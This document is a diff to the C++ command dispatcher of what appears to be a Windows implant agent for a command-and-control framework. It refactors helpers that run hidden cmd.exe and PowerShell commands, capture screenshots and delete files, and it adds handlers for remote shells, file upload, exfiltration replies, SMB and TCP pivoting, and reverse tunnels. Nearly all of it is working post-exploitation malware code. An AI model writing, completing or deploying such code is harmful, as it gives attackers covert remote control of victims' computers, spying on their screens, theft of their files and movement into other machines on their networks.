@@ -6,19 +6,36 @@
 // Wire format (agent → server, Big-Endian):
 //   [BE uint32 totalBlobSize][repeated: [BE uint32 taskId][BE uint32 cmdCode][BE fields…]]
 //
-// Command levels:
-//   L3 — fully implemented (no platform-specific evasion needed)
-//   L2 — partially implemented (uses Win32 API directly)
-//   L1 — explicit unsupported response
+// Command coverage bands for this scaffold (not a claim of full implant parity):
+//   C3 — protocol-aligned runnable scaffold path
+//   C2 — thin platform-backed implementation suitable as a template starting point
+//   C1 — explicit boundary/TODO/unsupported surface left for the developer
 
 #include "Commander.h"
 #include "Agent.h"
+#include "JobsController.h"
+#include "AsyncQueue.h"
+#include "RuntimeErrors.h"
+#include "RuntimeCommon.h"
+#include "TransportScaffold.h"
 #include "bof_loader.h"
 #include "../protocol/protocol.h"
 
 #include <stdio.h>
+#include <map>
 #include <string>
 #include <vector>
+
+struct MemoryChunkBuffer {
+    uint32_t totalSize;
+    std::vector<BYTE> data;
+};
+
+static std::map<uint32_t, MemoryChunkBuffer>& memoryStore()
+{
+    static std::map<uint32_t, MemoryChunkBuffer> store;
+    return store;
+}
 
 static WriterBE* buildOutputMessageResp(uint32_t kind, const uint8_t* data, uint32_t len)
 {
@@ -26,189 +43,6 @@ static WriterBE* buildOutputMessageResp(uint32_t kind, const uint8_t* data, uint
     WriterBEWriteUint32(w, kind);
     WriterBEWriteBytes(w, data, len);
     return w;
-}
-
-static BOOL runDetachedProcess(const char* program, const char* args, DWORD* outPid)
-{
-    if (!program || !program[0]) {
-        SetLastError(ERROR_INVALID_PARAMETER);
-        return FALSE;
-    }
-
-    char cmdLine[2048];
-    if (args && args[0]) {
-        snprintf(cmdLine, sizeof(cmdLine), "\"%s\" %s", program, args);
-    } else {
-        snprintf(cmdLine, sizeof(cmdLine), "\"%s\"", program);
-    }
-
-    STARTUPINFOA si = {};
-    PROCESS_INFORMATION pi = {};
-    si.cb = sizeof(si);
-    BOOL ok = CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE, CREATE_NO_WINDOW | DETACHED_PROCESS, NULL, NULL, &si, &pi);
-    if (!ok) {
-        return FALSE;
-    }
-    if (outPid) {
-        *outPid = pi.dwProcessId;
-    }
-    CloseHandle(pi.hThread);
-    CloseHandle(pi.hProcess);
-    return TRUE;
-}
-
-static BOOL runShellCapture(const char* cmdLine, std::string* outText)
-{
-    if (!cmdLine || !outText) {
-        SetLastError(ERROR_INVALID_PARAMETER);
-        return FALSE;
-    }
-
-    SECURITY_ATTRIBUTES sa = {};
-    sa.nLength = sizeof(sa);
-    sa.bInheritHandle = TRUE;
-
-    HANDLE readPipe = NULL;
-    HANDLE writePipe = NULL;
-    if (!CreatePipe(&readPipe, &writePipe, &sa, 0)) {
-        return FALSE;
-    }
-    SetHandleInformation(readPipe, HANDLE_FLAG_INHERIT, 0);
-
-    char fullCmd[2048];
-    snprintf(fullCmd, sizeof(fullCmd), "cmd /C %s", cmdLine);
-
-    STARTUPINFOA si = {};
-    PROCESS_INFORMATION pi = {};
-    si.cb = sizeof(si);
-    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
-    si.wShowWindow = SW_HIDE;
-    si.hStdOutput = writePipe;
-    si.hStdError = writePipe;
-
-    BOOL ok = CreateProcessA(NULL, fullCmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
-    CloseHandle(writePipe);
-    if (!ok) {
-        CloseHandle(readPipe);
-        return FALSE;
-    }
-
-    std::string output;
-    char buffer[4096];
-    DWORD bytesRead = 0;
-    while (ReadFile(readPipe, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0) {
-        output.append(buffer, buffer + bytesRead);
-    }
-
-    WaitForSingleObject(pi.hProcess, INFINITE);
-    CloseHandle(pi.hThread);
-    CloseHandle(pi.hProcess);
-    CloseHandle(readPipe);
-
-    *outText = output;
-    return TRUE;
-}
-
-static BOOL zipPathToFile(const char* srcPath, const char* zipPath)
-{
-    if (!srcPath || !zipPath) {
-        SetLastError(ERROR_INVALID_PARAMETER);
-        return FALSE;
-    }
-
-    char psCmd[4096];
-    snprintf(psCmd, sizeof(psCmd),
-        "powershell -NoProfile -Command \"Compress-Archive -Force -Path '%s' -DestinationPath '%s'\"",
-        srcPath, zipPath);
-
-    STARTUPINFOA si = {};
-    PROCESS_INFORMATION pi = {};
-    si.cb = sizeof(si);
-    si.dwFlags = STARTF_USESHOWWINDOW;
-    si.wShowWindow = SW_HIDE;
-
-    BOOL ok = CreateProcessA(NULL, psCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
-    if (!ok) {
-        return FALSE;
-    }
-
-    WaitForSingleObject(pi.hProcess, INFINITE);
-    DWORD exitCode = 1;
-    GetExitCodeProcess(pi.hProcess, &exitCode);
-    CloseHandle(pi.hThread);
-    CloseHandle(pi.hProcess);
-    if (exitCode != 0) {
-        SetLastError(ERROR_GEN_FAILURE);
-        return FALSE;
-    }
-    return TRUE;
-}
-
-static BOOL captureScreenshotPng(std::vector<BYTE>* outData)
-{
-    if (!outData) {
-        SetLastError(ERROR_INVALID_PARAMETER);
-        return FALSE;
-    }
-
-    char tempDir[MAX_PATH] = {0};
-    if (GetTempPathA(MAX_PATH, tempDir) == 0) {
-        return FALSE;
-    }
-
-    char tempFile[MAX_PATH] = {0};
-    if (GetTempFileNameA(tempDir, "axs", 0, tempFile) == 0) {
-        return FALSE;
-    }
-    DeleteFileA(tempFile);
-    strcat_s(tempFile, MAX_PATH, ".png");
-
-    char psCmd[8192];
-    snprintf(psCmd, sizeof(psCmd),
-        "powershell -NoProfile -Command \"Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $b=[System.Windows.Forms.SystemInformation]::VirtualScreen; $bmp=New-Object System.Drawing.Bitmap $b.Width,$b.Height; $g=[System.Drawing.Graphics]::FromImage($bmp); $g.CopyFromScreen($b.Left,$b.Top,0,0,$bmp.Size); $bmp.Save('%s', [System.Drawing.Imaging.ImageFormat]::Png); $g.Dispose(); $bmp.Dispose()\"",
-        tempFile);
-
-    STARTUPINFOA si = {};
-    PROCESS_INFORMATION pi = {};
-    si.cb = sizeof(si);
-    si.dwFlags = STARTF_USESHOWWINDOW;
-    si.wShowWindow = SW_HIDE;
-
-    BOOL ok = CreateProcessA(NULL, psCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
-    if (!ok) {
-        return FALSE;
-    }
-
-    WaitForSingleObject(pi.hProcess, INFINITE);
-    DWORD exitCode = 1;
-    GetExitCodeProcess(pi.hProcess, &exitCode);
-    CloseHandle(pi.hThread);
-    CloseHandle(pi.hProcess);
-    if (exitCode != 0) {
-        DeleteFileA(tempFile);
-        SetLastError(ERROR_GEN_FAILURE);
-        return FALSE;
-    }
-
-    HANDLE hFile = CreateFileA(tempFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) {
-        DeleteFileA(tempFile);
-        return FALSE;
-    }
-
-    DWORD fileSize = GetFileSize(hFile, NULL);
-    outData->resize(fileSize);
-    DWORD bytesRead = 0;
-    ok = ReadFile(hFile, outData->data(), fileSize, &bytesRead, NULL);
-    CloseHandle(hFile);
-    DeleteFileA(tempFile);
-
-    if (!ok) {
-        outData->clear();
-        return FALSE;
-    }
-    outData->resize(bytesRead);
-    return TRUE;
 }
 
 Commander::Commander(Agent* a)
@@ -245,85 +79,12 @@ static WriterBE* buildCommandErrorResp(uint32_t code)
 
 static WriterBE* buildSystemErrorResp()
 {
-    DWORD err = GetLastError();
-    if (err == ERROR_FILE_NOT_FOUND || err == ERROR_PATH_NOT_FOUND)
-        return buildCommandErrorResp(2);
-    if (err == ERROR_ACCESS_DENIED)
-        return buildCommandErrorResp(5);
-    return buildCommandErrorResp(31);
+    return buildCommandErrorResp(runtime_errors::MapSystemErrorCode(GetLastError()));
 }
 
 static WriterBE* buildUnsupportedResp()
 {
-    return buildCommandErrorResp(50);
-}
-
-static void DecodeWorkingTime(uint32_t wt, int* workStart, int* workEnd)
-{
-    if (!workStart || !workEnd) {
-        return;
-    }
-    if (wt == 0) {
-        *workStart = 0;
-        *workEnd = 0;
-        return;
-    }
-    int startHour = (int)((wt >> 24) & 0xff);
-    int startMin  = (int)((wt >> 16) & 0xff);
-    int endHour   = (int)((wt >> 8) & 0xff);
-    int endMin    = (int)(wt & 0xff);
-    *workStart = startHour * 100 + startMin;
-    *workEnd   = endHour * 100 + endMin;
-}
-
-// ─── Win32 helpers ─────────────────────────────────────────────────────────────
-
-static BOOL MkdirRecursive(const char* path)
-{
-    if (CreateDirectoryA(path, NULL))
-        return TRUE;
-    if (GetLastError() == ERROR_ALREADY_EXISTS)
-        return TRUE;
-
-    char tmp[MAX_PATH];
-    strncpy(tmp, path, MAX_PATH - 1);
-    tmp[MAX_PATH - 1] = '\0';
-    for (int i = (int)strlen(tmp) - 1; i > 0; i--) {
-        if (tmp[i] == '\\' || tmp[i] == '/') {
-            tmp[i] = '\0';
-            MkdirRecursive(tmp);
-            tmp[i] = '\\';
-            break;
-        }
-    }
-    if (CreateDirectoryA(path, NULL))
-        return TRUE;
-    return (GetLastError() == ERROR_ALREADY_EXISTS);
-}
-
-static BOOL RemoveRecursive(const char* path)
-{
-    DWORD attrs = GetFileAttributesA(path);
-    if (attrs == INVALID_FILE_ATTRIBUTES)
-        return FALSE;
-    if (!(attrs & FILE_ATTRIBUTE_DIRECTORY))
-        return DeleteFileA(path);
-
-    char search[MAX_PATH];
-    snprintf(search, MAX_PATH, "%s\\*", path);
-    WIN32_FIND_DATAA fd;
-    HANDLE hFind = FindFirstFileA(search, &fd);
-    if (hFind == INVALID_HANDLE_VALUE)
-        return FALSE;
-    do {
-        if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0)
-            continue;
-        char child[MAX_PATH];
-        snprintf(child, MAX_PATH, "%s\\%s", path, fd.cFileName);
-        RemoveRecursive(child);
-    } while (FindNextFileA(hFind, &fd));
-    FindClose(hFind);
-    return RemoveDirectoryA(path);
+    return buildCommandErrorResp(runtime_errors::UnsupportedCommandErrorCode());
 }
 
 // ─── Profile sub-command handler ───────────────────────────────────────────────
@@ -356,7 +117,7 @@ static WriterBE* handleProfile(Agent* agent, ReaderLE* r, uint32_t subcmd)
     }
     case 4: { // workingtime
         uint32_t wt = ReaderLEReadUint32(r);
-        DecodeWorkingTime(wt, &agent->workStart, &agent->workEnd);
+        runtime_common::DecodeWorkingTime(wt, &agent->workStart, &agent->workEnd);
         WriterBEWriteUint32(w, wt);
         break;
     }
@@ -486,7 +247,7 @@ void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, BYTE* outBuf, UL
 
         case COMMAND_MKDIR: {
             char* path = ReaderLEReadString(&r);
-            if (!MkdirRecursive(path)) {
+            if (!runtime_common::MkdirRecursive(path)) {
                 respW = buildSystemErrorResp();
                 respCmdCode = COMMAND_ERROR;
             } else {
@@ -501,7 +262,7 @@ void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, BYTE* outBuf, UL
 
         case COMMAND_RM: {
             char* path = ReaderLEReadString(&r);
-            if (!RemoveRecursive(path)) {
+            if (!runtime_common::RemoveRecursive(path)) {
                 respW = buildSystemErrorResp();
                 respCmdCode = COMMAND_ERROR;
             }
@@ -706,8 +467,27 @@ void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, BYTE* outBuf, UL
         // ── L2: JOB_LIST (empty) ───────────────────────────────────────────
 
         case COMMAND_JOB_LIST: {
-            respW = WriterBEInit(16);
-            WriterBEWriteUint32(respW, 0); // count = 0
+            std::vector<uint32_t> shellJobs = transport_scaffold::ShellJobEntries();
+            Job* jobsList = NULL;
+            int jobCount = agent->jobs ? agent->jobs->List(&jobsList) : 0;
+            uint32_t totalCount = (uint32_t)jobCount + (uint32_t)shellJobs.size();
+
+            respW = WriterBEInit(16 + totalCount * 8);
+            WriterBEWriteUint32(respW, totalCount);
+
+            for (int i = 0; i < jobCount; ++i) {
+                WriterBEWriteUint32(respW, jobsList[i].jobId);
+                WriterBEWriteUint16(respW, (uint16_t)jobsList[i].jobType);
+                WriterBEWriteUint16(respW, 0);
+            }
+            if (jobsList) {
+                LocalFree(jobsList);
+            }
+            for (size_t i = 0; i < shellJobs.size(); ++i) {
+                WriterBEWriteUint32(respW, shellJobs[i]);
+                WriterBEWriteUint16(respW, (uint16_t)JOB_TYPE_SHELL);
+                WriterBEWriteUint16(respW, 0);
+            }
             break;
         }
 
@@ -716,7 +496,8 @@ void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, BYTE* outBuf, UL
         case COMMAND_JOBS_KILL: {
             uint32_t jobId = ReaderLEReadUint32(&r);
             respW = WriterBEInit(16);
-            WriterBEWriteUint8(respW, 0);           // result = not found
+            BOOL result = transport_scaffold::KillShellJob(jobId) || (agent->jobs && agent->jobs->Kill(jobId));
+            WriterBEWriteUint8(respW, result ? 1 : 0);
             WriterBEWriteUint32(respW, jobId);
             break;
         }
@@ -729,7 +510,7 @@ void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, BYTE* outBuf, UL
             taskId = ReaderLEReadUint32(&r); // taskId is inside RUN data
             taskIdConsumed = TRUE;
             DWORD pid = 0;
-            if (!runDetachedProcess(prog, args, &pid)) {
+            if (!runtime_common::RunDetachedProcess(prog, args, &pid)) {
                 respW = buildSystemErrorResp();
                 respCmdCode = COMMAND_ERROR;
             } else {
@@ -747,7 +528,7 @@ void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, BYTE* outBuf, UL
         case COMMAND_SHELL: {
             char* cmdLine = ReaderLEReadString(&r);
             std::string output;
-            if (!runShellCapture(cmdLine, &output)) {
+            if (!runtime_common::RunShellCapture(cmdLine, &output)) {
                 respW = buildSystemErrorResp();
                 respCmdCode = COMMAND_ERROR;
             } else {
@@ -762,7 +543,7 @@ void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, BYTE* outBuf, UL
 
         case COMMAND_SCREENSHOT: {
             std::vector<BYTE> img;
-            if (!captureScreenshotPng(&img)) {
+            if (!runtime_common::CaptureScreenshotPng(&img)) {
                 respW = buildSystemErrorResp();
                 respCmdCode = COMMAND_ERROR;
             } else {
@@ -777,7 +558,7 @@ void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, BYTE* outBuf, UL
         case COMMAND_ZIP: {
             char* srcPath = ReaderLEReadString(&r);
             char* zipPath = ReaderLEReadString(&r);
-            if (!zipPathToFile(srcPath, zipPath)) {
+            if (!runtime_common::ZipPathToFile(srcPath, zipPath)) {
                 respW = buildSystemErrorResp();
                 respCmdCode = COMMAND_ERROR;
             } else {
@@ -785,6 +566,311 @@ void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, BYTE* outBuf, UL
                 WriterBEWriteString(respW, zipPath);
             }
             free(srcPath); free(zipPath);
+            break;
+        }
+
+        // ── L2: PS_RUN / REV2SELF / SAVEMEMORY / UPLOAD / EXFIL ───────────
+
+        case COMMAND_PS_RUN: {
+            BOOL outputRequested = ReaderLEReadUint8(&r) ? TRUE : FALSE;
+            BOOL impersonation   = ReaderLEReadUint8(&r) ? TRUE : FALSE;
+            ReaderLEReadUint32(&r);
+            char* commandLine = ReaderLEReadString(&r);
+
+            if (outputRequested || impersonation) {
+                respW = buildUnsupportedResp();
+                respCmdCode = COMMAND_ERROR;
+            } else {
+                STARTUPINFOA si = {};
+                PROCESS_INFORMATION pi = {};
+                si.cb = sizeof(si);
+                std::string cmd = commandLine ? std::string(commandLine) : std::string();
+                std::vector<char> cmdBuf(cmd.begin(), cmd.end());
+                cmdBuf.push_back('\0');
+                if (!CreateProcessA(NULL, cmdBuf.data(), NULL, NULL, FALSE, CREATE_NO_WINDOW | DETACHED_PROCESS, NULL, NULL, &si, &pi)) {
+                    respW = buildSystemErrorResp();
+                    respCmdCode = COMMAND_ERROR;
+                } else {
+                    respW = WriterBEInit((uint32_t)cmd.size() + 16);
+                    WriterBEWriteUint32(respW, pi.dwProcessId);
+                    WriterBEWriteUint8(respW, 0);
+                    WriterBEWriteString(respW, commandLine ? commandLine : "");
+                    CloseHandle(pi.hThread);
+                    CloseHandle(pi.hProcess);
+                }
+            }
+            free(commandLine);
+            break;
+        }
+
+        case COMMAND_REV2SELF: {
+            respW = WriterBEInit(4);
+            break;
+        }
+
+        case COMMAND_SAVEMEMORY: {
+            uint32_t memoryId = ReaderLEReadUint32(&r);
+            uint32_t totalSize = ReaderLEReadUint32(&r);
+            uint32_t chunkLen = 0;
+            uint8_t* chunk = ReaderLEReadBytes(&r, &chunkLen);
+            MemoryChunkBuffer& entry = memoryStore()[memoryId];
+            if (entry.totalSize == 0) {
+                entry.totalSize = totalSize;
+            }
+            if (chunk && chunkLen > 0) {
+                entry.data.insert(entry.data.end(), chunk, chunk + chunkLen);
+            }
+            break;
+        }
+
+        case COMMAND_UPLOAD: {
+            uint32_t memoryId = ReaderLEReadUint32(&r);
+            char* remotePath = ReaderLEReadString(&r);
+            std::map<uint32_t, MemoryChunkBuffer>::iterator it = memoryStore().find(memoryId);
+            if (it == memoryStore().end()) {
+                respW = buildCommandErrorResp(ERROR_FILE_NOT_FOUND);
+                respCmdCode = COMMAND_ERROR;
+            } else {
+                std::vector<BYTE> data = it->second.data;
+                if (it->second.totalSize > 0 && data.size() > it->second.totalSize) {
+                    data.resize(it->second.totalSize);
+                }
+                HANDLE hFile = CreateFileA(remotePath, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+                if (hFile == INVALID_HANDLE_VALUE) {
+                    respW = buildSystemErrorResp();
+                    respCmdCode = COMMAND_ERROR;
+                } else {
+                    DWORD written = 0;
+                    BOOL ok = data.empty() ? TRUE : WriteFile(hFile, data.data(), (DWORD)data.size(), &written, NULL);
+                    CloseHandle(hFile);
+                    if (!ok || written != data.size()) {
+                        respW = buildSystemErrorResp();
+                        respCmdCode = COMMAND_ERROR;
+                    } else {
+                        respW = WriterBEInit(4);
+                    }
+                }
+                memoryStore().erase(it);
+            }
+            free(remotePath);
+            break;
+        }
+
+        case COMMAND_EXFIL: {
+            uint32_t state = ReaderLEReadUint32(&r);
+            uint32_t fileId = ReaderLEReadUint32(&r);
+            respW = WriterBEInit(16);
+            WriterBEWriteUint32(respW, fileId);
+            WriterBEWriteUint8(respW, (uint8_t)state);
+            respCmdCode = COMMAND_EXFIL;
+            break;
+        }
+
+        // ── L3: interactive shell scaffold ─────────────────────────────────
+
+        case COMMAND_SHELL_START: {
+            uint32_t shellId = ReaderLEReadUint32(&r);
+            char* programArgs = ReaderLEReadString(&r);
+            DWORD errCode = 0;
+            respW = WriterBEInit(16);
+            WriterBEWriteUint8(respW, JOB_TYPE_SHELL);
+            if (transport_scaffold::StartShellSession(shellId, programArgs, &errCode)) {
+                WriterBEWriteUint8(respW, JOB_STATE_STARTING);
+            } else {
+                WriterBEWriteUint8(respW, JOB_STATE_FINISHED);
+                WriterBEWriteUint32(respW, runtime_errors::MapSystemErrorCode(errCode));
+            }
+            respCmdCode = COMMAND_JOB;
+            taskId = shellId;
+            taskIdConsumed = TRUE;
+            free(programArgs);
+            break;
+        }
+
+        case COMMAND_SHELL_WRITE: {
+            uint32_t shellId = ReaderLEReadUint32(&r);
+            uint32_t payloadLen = 0;
+            uint8_t* payload = ReaderLEReadBytes(&r, &payloadLen);
+            DWORD errCode = 0;
+            if (!transport_scaffold::WriteShellInput(shellId, payload, payloadLen, &errCode)) {
+                respW = buildCommandErrorResp(runtime_errors::MapSystemErrorCode(errCode));
+                respCmdCode = COMMAND_ERROR;
+            }
+            taskId = shellId;
+            taskIdConsumed = TRUE;
+            break;
+        }
+
+        case COMMAND_SHELL_CLOSE: {
+            uint32_t shellId = ReaderLEReadUint32(&r);
+            transport_scaffold::CloseShellSession(shellId);
+            taskId = shellId;
+            taskIdConsumed = TRUE;
+            break;
+        }
+
+        // ── L3: pivot scaffold ─────────────────────────────────────────────
+
+        case COMMAND_LINK: {
+            uint32_t pivotType = ReaderLEReadUint32(&r);
+            if (pivotType == transport_scaffold::PIVOT_TYPE_SMB) {
+                char* pipeName = ReaderLEReadString(&r);
+                uint32_t linkTaskId = ReaderLEReadUint32(&r);
+                taskId = linkTaskId;
+                taskIdConsumed = TRUE;
+
+                std::vector<uint8_t> payload;
+                DWORD errCode = 0;
+                if (transport_scaffold::StartPivotSmb(linkTaskId, pipeName, &payload, &errCode)) {
+                    respW = WriterBEInit((uint32_t)payload.size() + 8);
+                    WriterBEAppendRaw(respW, payload.data(), (uint32_t)payload.size());
+                } else {
+                    respW = buildCommandErrorResp(runtime_errors::MapSystemErrorCode(errCode));
+                    respCmdCode = COMMAND_ERROR;
+                }
+                free(pipeName);
+            } else if (pivotType == transport_scaffold::PIVOT_TYPE_TCP) {
+                char* address = ReaderLEReadString(&r);
+                uint32_t port = ReaderLEReadUint32(&r);
+                uint32_t linkTaskId = ReaderLEReadUint32(&r);
+                taskId = linkTaskId;
+                taskIdConsumed = TRUE;
+
+                std::vector<uint8_t> payload;
+                DWORD errCode = 0;
+                if (transport_scaffold::StartPivotTcp(linkTaskId, address, (uint16_t)port, &payload, &errCode)) {
+                    respW = WriterBEInit((uint32_t)payload.size() + 8);
+                    WriterBEAppendRaw(respW, payload.data(), (uint32_t)payload.size());
+                } else {
+                    respW = buildCommandErrorResp(runtime_errors::MapSystemErrorCode(errCode));
+                    respCmdCode = COMMAND_ERROR;
+                }
+                free(address);
+            } else {
+                respW = buildUnsupportedResp();
+                respCmdCode = COMMAND_ERROR;
+            }
+            respCmdCode = (respCmdCode == COMMAND_ERROR) ? COMMAND_ERROR : COMMAND_LINK;
+            break;
+        }
+
+        case COMMAND_UNLINK: {
+            uint32_t pivotId = ReaderLEReadUint32(&r);
+            uint32_t unlinkTaskId = ReaderLEReadUint32(&r);
+            taskId = unlinkTaskId;
+            taskIdConsumed = TRUE;
+            respW = WriterBEInit(16);
+            WriterBEWriteUint32(respW, pivotId);
+            WriterBEWriteUint8(respW, transport_scaffold::ClosePivotSession(pivotId));
+            respCmdCode = COMMAND_UNLINK;
+            break;
+        }
+
+        case COMMAND_PIVOT_EXEC: {
+            uint32_t pivotId = ReaderLEReadUint32(&r);
+            uint32_t payloadLen = 0;
+            uint8_t* payload = ReaderLEReadBytes(&r, &payloadLen);
+            DWORD errCode = 0;
+            if (!transport_scaffold::WritePivotData(pivotId, payload, payloadLen, &errCode)) {
+                respW = buildCommandErrorResp(runtime_errors::MapSystemErrorCode(errCode));
+                respCmdCode = COMMAND_ERROR;
+            }
+            break;
+        }
+
+        // ── L3: tunnel scaffold ────────────────────────────────────────────
+
+        case COMMAND_TUNNEL_START_TCP: {
+            uint32_t channelId = ReaderLEReadUint32(&r);
+            uint32_t tunnelType = ReaderLEReadUint32(&r);
+            char* address = ReaderLEReadString(&r);
+            uint32_t port = ReaderLEReadUint32(&r);
+            uint32_t tunnelTaskId = ReaderLEReadUint32(&r);
+            taskId = tunnelTaskId;
+            taskIdConsumed = TRUE;
+
+            std::vector<uint8_t> payload;
+            DWORD errCode = 0;
+            transport_scaffold::StartTcpTunnel(channelId, tunnelType, address, (uint16_t)port, &payload, &errCode);
+            respW = WriterBEInit((uint32_t)payload.size() + 8);
+            WriterBEAppendRaw(respW, payload.data(), (uint32_t)payload.size());
+            respCmdCode = COMMAND_TUNNEL_START_TCP;
+            free(address);
+            break;
+        }
+
+        case COMMAND_TUNNEL_START_UDP: {
+            uint32_t channelId = ReaderLEReadUint32(&r);
+            char* address = ReaderLEReadString(&r);
+            uint32_t port = ReaderLEReadUint32(&r);
+            uint32_t tunnelTaskId = ReaderLEReadUint32(&r);
+            taskId = tunnelTaskId;
+            taskIdConsumed = TRUE;
+
+            std::vector<uint8_t> payload;
+            DWORD errCode = 0;
+            transport_scaffold::StartUdpTunnel(channelId, address, (uint16_t)port, &payload, &errCode);
+            respW = WriterBEInit((uint32_t)payload.size() + 8);
+            WriterBEAppendRaw(respW, payload.data(), (uint32_t)payload.size());
+            respCmdCode = COMMAND_TUNNEL_START_TCP;
+            free(address);
+            break;
+        }
+
+        case COMMAND_TUNNEL_WRITE_TCP:
+        case COMMAND_TUNNEL_WRITE_UDP: {
+            uint32_t channelId = ReaderLEReadUint32(&r);
+            uint32_t payloadLen = 0;
+            uint8_t* payload = ReaderLEReadBytes(&r, &payloadLen);
+            DWORD errCode = 0;
+            if (!transport_scaffold::WriteTunnelData(channelId, payload, payloadLen, &errCode)) {
+                transport_scaffold::NoteTunnelWriteFailure(channelId, runtime_errors::MapSystemErrorCode(errCode));
+            }
+            taskId = channelId;
+            taskIdConsumed = TRUE;
+            break;
+        }
+
+        case COMMAND_TUNNEL_CLOSE: {
+            uint32_t channelId = ReaderLEReadUint32(&r);
+            transport_scaffold::CloseTunnelSession(channelId);
+            taskId = channelId;
+            taskIdConsumed = TRUE;
+            break;
+        }
+
+        case COMMAND_TUNNEL_REVERSE: {
+            uint32_t tunnelId = ReaderLEReadUint32(&r);
+            uint32_t port = ReaderLEReadUint32(&r);
+            uint32_t tunnelTaskId = ReaderLEReadUint32(&r);
+            taskId = tunnelTaskId;
+            taskIdConsumed = TRUE;
+
+            std::vector<uint8_t> payload = transport_scaffold::StartReverseTunnel(tunnelId, (uint16_t)port);
+            respW = WriterBEInit((uint32_t)payload.size() + 8);
+            WriterBEAppendRaw(respW, payload.data(), (uint32_t)payload.size());
+            respCmdCode = COMMAND_TUNNEL_REVERSE;
+            break;
+        }
+
+        case COMMAND_TUNNEL_ACCEPT: {
+            ReaderLEReadUint32(&r);
+            break;
+        }
+
+        case COMMAND_TUNNEL_PAUSE: {
+            uint32_t channelId = ReaderLEReadUint32(&r);
+            transport_scaffold::SetTunnelPaused(channelId, TRUE);
+            taskId = channelId;
+            taskIdConsumed = TRUE;
+            break;
+        }
+
+        case COMMAND_TUNNEL_RESUME: {
+            uint32_t channelId = ReaderLEReadUint32(&r);
+            transport_scaffold::SetTunnelPaused(channelId, FALSE);
+            taskId = channelId;
+            taskIdConsumed = TRUE;
             break;
         }
 
@@ -815,17 +901,6 @@ void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, BYTE* outBuf, UL
                 BofContextFree(ctx);
             }
             free(entry);
-            break;
-        }
-
-        // ── L1: SAVEMEMORY (consume, no response) ──────────────────────────
-
-        case COMMAND_SAVEMEMORY: {
-            ReaderLEReadUint32(&r); // memoryId
-            ReaderLEReadUint32(&r); // totalSize
-            uint32_t chunkLen;
-            ReaderLEReadBytes(&r, &chunkLen); // [4B chunkSize][chunk data]
-            // No response
             break;
         }
 
